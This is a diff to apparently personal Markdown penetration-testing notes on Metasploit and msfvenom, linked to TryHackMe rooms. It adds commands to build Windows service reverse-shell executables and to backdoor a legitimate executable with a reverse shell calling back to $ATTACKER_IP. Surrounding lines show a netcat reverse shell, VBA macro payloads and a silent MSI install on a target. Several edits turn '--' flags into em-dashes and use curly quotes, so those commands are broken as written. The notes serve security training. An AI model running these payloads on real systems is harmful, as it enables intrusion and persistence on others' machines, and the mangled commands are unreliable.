@@ -23,7 +23,7 @@ You can use msfconsole as a shell, but there’s no redirect functionality.
 * `search` — search modules; query to a particular type of module using the `type:` parameter (e.g., `search type:exploit wordpress`)
 * `services` — display services discovered in known hosts in DB
 * `sessions` — list open Meterpreter sessions on a box
-* `sessions -i $SESSION_NUMER` — connect to Meterpreter session $SESSION_NUMBER
+* `sessions -i $SESSION_NUMER` — connect to Meterpreter session `$SESSION_NUMBER`
 * `show auxiliary` — show auxiliary modules, filtered by relevancy if called from within a module
 * `show exploits` — show exploit modules
 * `show options` — show module options
@@ -96,11 +96,11 @@ Payloads follow the OS/ARCHITECTURE/PAYLOAD (though ARCHITECTURE is not included
 
 **Note:** Metasploit defaults to sending 32-bit payloads, but an increasing number of things won’t work on a 64-bit system from a 32-bit meterpreter shell. It’s probably best to explicitly set the `payload` option to use a 64-bit payload unless you *know* that you’ll be dealing with a 32-bit system.
 
-List all available payloads using `msfvenom --list payloads` or `show payloads` from within the Metasploit console.
+List all available payloads using `msfvenom —list payloads` or `show payloads` from within the Metasploit console.
 
 A specific payload can be set in the Metasploit console use the `set PAYLOAD full/path/to/payload`.
 
-If you initially get a native shell, use the `post/multi/manage/shell_to_meterpreter` module to upgrade to Meterpeter. (NOTE: shell_to_meterpreter creates a new connection on a new port, by default 4433.)
+If you initially get a native shell, use the `post/multi/manage/shell_to_meterpreter` module to upgrade to Meterpeter. (NOTE: `shell_to_meterpreter` creates a new connection on a new port, by default 4433.)
 
 #### Additional Resources
 * [Metasploit Basics, Part 8: Exploitation with EternalBlue](https://www.hackers-arise.com/post/2017/06/12/metasploit-basics-part-8-exploitation-with-eternalblue)
@@ -257,7 +257,7 @@ What’s going on here?
 * We then spin up a netcat instance directed at our local machine (`nc $LOCAL_IP $LOCAL_PORT`), direct the contents of the pipe into netcat’s STDIN (`0< /tmp/qdsrgu`), pipe the *output* of netcat to a shell we know probably exists (`| /bin/sh`), and finally redirect *both* STDOUT and STDERR back into the named pipe (`> /tmp/qdsrgu 2>&1`).
 * On the local machine, `nc -lvp $LOCAL_PORT` listens for the incoming netcat connection from the remote. Anything we type on STDIN here gets sent to the remote and piped to /bin/sh *there*. The output of /bin/sh is then sent to the named pipe, which dumps into (the remote) netcat, which then sends the data to the local machine where it ends up on STDOUT.
 
-Use `--list formats` to see available encoding formats.
+Use `—list formats` to see available encoding formats.
 
 ```bash
 # 32-bit Linux ELF Meterpreter payload
@@ -274,6 +274,14 @@ msfvenom -p osx/x86/shell_reverse_tcp \
 #
 msfvenom -p windows/meterpreter/reverse_tcp \
 	LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f exe -o revshell.exe
+
+# 32-bit (?) Windows SERVICE executable (note that these
+# require additional API calls to work, beyond what `-f exe`
+# provides)
+#
+msfvenom -p windows/meterpreter/reverse_tcp \
+	LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f exe-service \
+	                                  -o revshell.exe
 
 # PHP Meterpreter payload
 #
@@ -312,7 +320,7 @@ msfvenom -p windows/meterpreter/reverse_tcp \
 
 # VBA Meterpreter payload
 #
-# Note that this can't be used as-is, but must first be copied
+# Note that this can’t be used as-is, but must first be copied
 # into a Microsoft Office document as a macro. The generated
 # code hooks the Workbook_Open() function, but this must be
 # changed to Document_Open() for Word.
@@ -327,6 +335,7 @@ System-specific shell codes can also be produced by appropriately varying the `-
 * [Shell to Meterpreter Upgrade](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/manage/shell_to_meterpreter)
 * [TryHackMe: Weaponization](https://tryhackme.com/room/weaponization)
 * [Exploiting HTML Applications](./Exploiting%20HTML%20Applications.md)
+* [TryHackMe: Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20)
 
 ### 32-Bit Windows Programs
 By default, msfvenom produces 64-bit executables when using the `-f exe`. This doesn’t work, however, if you’re trying to replace a program in Program Files (x86). In this case, you’ll need to explicitly instruct msfvenom to encode a 32-bit binary using  `-e x86/shikata_ga_nai`.
@@ -356,8 +365,22 @@ Then install on the target to get a shell:
 msiexec /quiet /qn /i $INSTALLER.msi
 ```
 
-### Catching Shells
-Use the `exploit/multi/handler` module in Metasploit to catch the shells produced using msfvenom. Note that you’ll need to use `set payload` to tell Metasploit *what* it’s catching — for example, `windows/meterpreter/reverse_tcp`. We can catch both regular reverse shells and meterpreter sessions this way.
+#### Additional Resources
+* [TryHackMe: Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20)
+
+### Backdooring Executables
+```bash
+msfvenom -a x64 —platform windows -x $UNMODIFIED_EXE_NAME \
+         -k -p windows/x64/shell_reverse_tcp \
+         LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \
+         -b “\x00” -f exe -o $BACKDOOR_EXE_NAME
+```
 
 #### Additional Resources
+* [TryHackMe: Windows Local Persistence](https://tryhackme.com/room/windowslocalpersistence) 
+
+## Catching Shells
+Use the `exploit/multi/handler` module in Metasploit to catch the shells produced using msfvenom. Note that you’ll need to use `set payload` to tell Metasploit *what* it’s catching — for example, `windows/meterpreter/reverse_tcp`. We can catch both regular reverse shells and meterpreter sessions this way.
+
+### Additional Resources
 * [TryHackMe: Weaponization](https://tryhackme.com/room/weaponization)
